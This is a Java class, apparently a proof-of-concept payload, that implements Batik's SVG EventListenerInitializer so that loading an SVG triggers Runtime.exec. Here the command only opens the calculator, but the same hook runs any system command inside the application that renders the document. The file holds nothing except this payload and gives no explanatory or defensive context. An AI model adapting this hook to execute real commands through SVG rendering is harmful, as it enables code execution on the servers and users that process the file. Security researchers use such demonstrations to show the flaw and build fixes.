import org.w3c.dom.svg.EventListenerInitializer;
import org.w3c.dom.svg.SVGDocument;

import java.io.IOException;

public class MyListen implements EventListenerInitializer {
    public void initializeEventListeners(SVGDocument svgDocument) {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}